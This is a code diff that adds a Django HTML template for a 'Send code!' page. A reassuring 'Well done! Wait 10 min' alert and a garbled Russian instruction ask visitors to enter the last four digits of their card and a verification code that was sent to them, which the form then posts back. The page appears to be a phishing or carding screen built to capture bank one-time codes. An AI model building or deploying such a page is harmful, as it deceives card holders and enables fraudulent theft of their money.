@@ -1,0 +1,31 @@
+{% extends "base.html" %}
+
+{% load crispy_forms_tags %}
+
+{% block content %}
+<br />
+</hr>
+</br>
+<h3>Send code!</h3>
+<hr>
+<br>
+  
+
+  <div class="bd-example-snippet bd-code-snippet"><div class="bd-example">
+        <div class="alert alert-success" role="alert">
+          <h4 class="alert-heading">Well done!</h4>
+          <p></br>Wait 10 min!!! <br>enter the card :</p>
+          <hr>
+          <p  style='text-type: bold;' class="mb-0">please wait. [Ввыдите карта последная 4 номерь и отправлены код].</p>
+        </div>
+        </div></div>
+
+
+
+
+<br>
+<form method='post' enctype='multipart/form_data'>{% csrf_token %}
+{{ form|crispy }}
+<button class='btn btn-success ml-2' type='submit'>Send</buttons>
+</form>
+{% endblock content %}
